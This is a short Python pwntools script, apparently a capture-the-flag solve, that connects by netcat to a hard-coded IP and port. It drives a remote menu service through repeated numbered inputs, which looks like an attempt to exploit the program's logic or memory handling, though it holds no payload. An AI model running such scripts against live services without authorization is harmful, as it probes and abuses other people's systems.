from pwn import *
import time

def microsleep():
    pass

p = process(['nc', '161.97.134.238', '7000'])
time.sleep(5)
print(p.clean())

for i in range(37):
    p.sendline('1')
    microsleep()
    print(p.clean())
    p.sendline(str(i))
    microsleep()
    print(p.clean())
    p.sendline('100')
    microsleep()
    print(p.clean())

p.sendline('3')
print(p.clean())
microsleep()
p.sendline('4')
print(p.clean())
microsleep()
p.sendline('5')
print(p.clean())
microsleep()
p.sendline('3')
print(p.clean())